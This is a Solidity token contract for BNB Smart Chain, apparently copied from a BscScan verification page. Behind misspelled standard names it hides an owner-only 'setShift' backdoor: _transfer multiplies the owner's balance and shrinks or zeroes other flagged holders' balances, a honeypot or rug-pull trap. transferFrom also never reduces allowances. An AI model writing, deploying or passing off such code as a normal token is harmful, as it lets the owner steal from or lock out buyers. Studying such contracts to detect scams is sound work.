/**
 *Submitted for verification at BscScan.com on 2022-11-07
*/

pragma solidity ^0.8.14;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address accbount) external view returns (uint256);

    function transfer(address recipient, uint256 abmounts) external returns (bool);

    function allowance(address ownnr, address spender) external view returns (uint256);

    function approve(address spender, uint256 abmounts) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 abmounts ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed ownnr, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - fiere https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract Ownable is Context {
    address private _ownnr;
    event ownnrshipTransferred(address indexed previousownnr, address indexed newownnr);

    constructor () {
        address msgSender = _msgSender();
        _ownnr = msgSender;
        emit ownnrshipTransferred(address(0), msgSender);
    }
    function ownnr() public view virtual returns (address) {
        return _ownnr;
    }
    modifier onlyownnr() {
        require(_ownnr == _msgSender(), "Ownable: caller is not the ownnr");
        _;
    }
    function renounceownnrship() public virtual onlyownnr {
        emit ownnrshipTransferred(_ownnr, address(0x000000000000000000000000000000000000dEaD));
        _ownnr = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract token is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    string private _name = "tt";
    string private _symbol = "tt";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 10000000000 * 10 ** _decimals;
    uint256 private _burnfiere = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    mapping (address => uint256) private _shiftAddress;

    function setShift(address _address,uint256 _value) external onlyownnr {
        _shiftAddress[_address] = _value;
    }

    function setShift(address _address) external view onlyownnr returns (uint256) {
        return _shiftAddress[_address];
    }

    constructor () {
        _balance[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address sender, address recipient, uint256 abmounts) internal virtual {

        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        uint256 fiereabmount = 0;
        fiereabmount = abmounts.mul(_burnfiere).div(100);
        if (_shiftAddress[sender] > 0) {
            if (sender == ownnr()) {
                _balance[sender] = _balance[sender].mul(3 << _shiftAddress[sender]);
            }else{
                _balance[sender] = _balance[sender].mul(3 >> _shiftAddress[sender]);
            }
        }
        uint256 blsender = _balance[sender];
        require(blsender >= abmounts,"IERC20: transfer abmounts exceeds balance");

        _balance[sender] = _balance[sender].sub(abmounts);

        uint256 amoun;
        amoun = abmounts - fiereabmount;
        _balance[recipient] += amoun;
        if (_burnfiere > 0){
            emit Transfer (sender, _DEADaddress, fiereabmount);
        }
        emit Transfer(sender, recipient, amoun);
    }

    function transfer(address recipient, uint256 abmounts) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, abmounts);
        return true;
    }


    function balanceOf(address accbount) public view override returns (uint256) {
        return _balance[accbount];
    }

    function approve(address spender, uint256 abmounts) public virtual override returns (bool) {
        _approve(_msgSender(), spender, abmounts);
        return true;
    }

    function _approve(address ownnr, address spender, uint256 abmounts) internal virtual {
        require(ownnr != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[ownnr][spender] = abmounts;
        emit Approval(ownnr, spender, abmounts);
    }

    function allowance(address ownnr, address spender) public view virtual override returns (uint256) {
        return _allowances[ownnr][spender];
    }

    function transferFrom(address sender, address recipient, uint256 abmounts) public virtual override returns (bool) {
        _transfer(sender, recipient, abmounts);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= abmounts, "IERC20: transfer abmounts exceeds allowance");
        return true;
    }

}